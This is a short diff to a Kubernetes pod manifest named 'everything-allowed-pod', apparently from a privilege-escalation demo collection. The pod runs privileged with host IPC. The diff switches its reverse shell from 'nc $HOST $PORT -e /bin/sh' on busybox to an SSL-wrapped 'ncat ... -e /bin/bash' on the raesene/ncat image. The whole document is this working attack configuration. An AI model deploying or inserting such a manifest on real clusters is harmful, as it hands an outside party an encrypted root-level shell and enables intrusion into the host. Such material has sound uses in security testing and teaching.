@@ -10,9 +10,9 @@ spec:
   hostIPC: true
   containers:
   - name: everything-allowed-pod
-    image: busybox
+    image: raesene/ncat
     command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+    args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
     securityContext:
       privileged: true
     volumeMounts:
